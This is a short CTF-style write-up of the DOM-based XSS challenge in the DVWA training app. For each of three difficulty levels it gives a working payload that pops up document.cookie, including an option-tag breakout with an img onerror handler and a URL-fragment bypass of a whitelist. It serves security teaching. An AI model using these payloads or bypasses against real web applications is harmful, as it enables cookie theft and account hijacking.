---
title: "DOM Based Cross Site Scripting (XSS) - DVWA"
description: ""
summary: "Trigger an alert pop-up with cookie values using DOM-based XSS."
date: 2022-08-17
draft: false
author: "Aftab Sama" # ["Me", "You"] # multiple authors
tags: ["writeups", "challenge", "DVWA", "DOM XSS"]
canonicalURL: ""
showToc: true
TocOpen: false
TocSide: 'right'  # or 'left'
weight: 9
# aliases: ["/first"]
hidemeta: false
comments: false
disableHLJS: true # to disable highlightjs
disableShare: true
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
# UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
# editPost:
#     URL: "https://github.com/"
#     Text: "Suggest Changes" # edit text
#     appendFilePath: true # to append file path to Edit link
---


### **Security level: low**


We have option to select language and value is reflected in GET parameter default=English.

payload=`<script>alert(document.cookie);</script>`

using this it will trigger an alert pop up with cookie values.


### **Security level: medium**

we are stuck inside option tag so we have escape that and we can't use script tag because that is blocked so we use image tag.

payload=`" ></option></select><img src=x onerror="alert(document.cookie)">`


### **Security level: high**

This time server is using whitelist we can bypass that by puting our payload after `#` because anything after `#` is not sent to 
server but still reflecting on the page.

payload=`#<script>alert(document.cookie);</script>`


Happy Hacking
